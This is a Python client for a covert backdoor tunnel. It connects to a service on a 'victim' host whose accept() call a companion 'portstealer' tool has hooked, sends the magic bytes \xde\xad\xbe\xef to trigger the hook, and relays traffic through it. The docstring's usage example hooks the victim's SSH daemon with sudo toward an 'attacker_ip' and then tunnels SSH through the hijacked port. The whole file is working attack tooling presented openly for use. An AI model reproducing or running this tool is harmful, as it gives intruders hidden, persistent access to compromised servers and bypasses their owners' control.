#!/usr/bin/env python3
"""
Tunnel client proxy.

Listens on <local-port>.  For every incoming connection:
  1. Connects to <remote-ip>:<remote-port>  (the service whose accept() is hooked)
  2. Sends the 4-byte magic  \xde\xad\xbe\xef  to trigger the hook
  3. Bidirectionally relays data with select()

Usage:
    python3 client.py <local-port> <remote-ip> <remote-port>

Example:
    # Hook the SSH daemon on the victim:
    sudo ./portstealer 22 attacker_ip 4444

    # Run this proxy locally:
    python3 client.py 2222 victim_ip 22

    # Now connect through the tunnel:
    ssh user@localhost -p 2222
"""

import sys
import socket
import select
import threading

MAGIC = b'\xde\xad\xbe\xef'
BUF   = 4096


def relay(a: socket.socket, b: socket.socket) -> None:
    """Block until either side closes, copying bytes in both directions."""
    socks = [a, b]
    try:
        while True:
            readable, _, broken = select.select(socks, [], socks)
            if broken:
                break
            for src in readable:
                data = src.recv(BUF)
                if not data:
                    return
                dst = b if src is a else a
                dst.sendall(data)
    except OSError:
        pass


def handle(local: socket.socket, peer: str, remote_addr: tuple) -> None:
    try:
        remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        remote.connect(remote_addr)
        remote.sendall(MAGIC)
        print(f"[+] {peer}  magic sent → relay open")
        relay(local, remote)
    except OSError as e:
        print(f"[-] {peer}  {e}", file=sys.stderr)
    finally:
        local.close()
        try:
            remote.close()
        except Exception:
            pass
        print(f"[.] {peer}  relay closed")


def main() -> None:
    if len(sys.argv) != 4:
        print(f"usage: {sys.argv[0]} <local-port> <remote-ip> <remote-port>",
              file=sys.stderr)
        sys.exit(1)

    local_port  = int(sys.argv[1])
    remote_ip   = sys.argv[2]
    remote_port = int(sys.argv[3])
    remote_addr = (remote_ip, remote_port)

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", local_port))
    srv.listen(64)
    print(f"[*] listening on :{local_port}  →  {remote_ip}:{remote_port}")

    try:
        while True:
            conn, addr = srv.accept()
            peer = f"{addr[0]}:{addr[1]}"
            print(f"[>] {peer}")
            t = threading.Thread(
                target=handle,
                args=(conn, peer, remote_addr),
                daemon=True,
            )
            t.start()
    except KeyboardInterrupt:
        print("\n[*] shutting down")
    finally:
        srv.close()


if __name__ == "__main__":
    main()
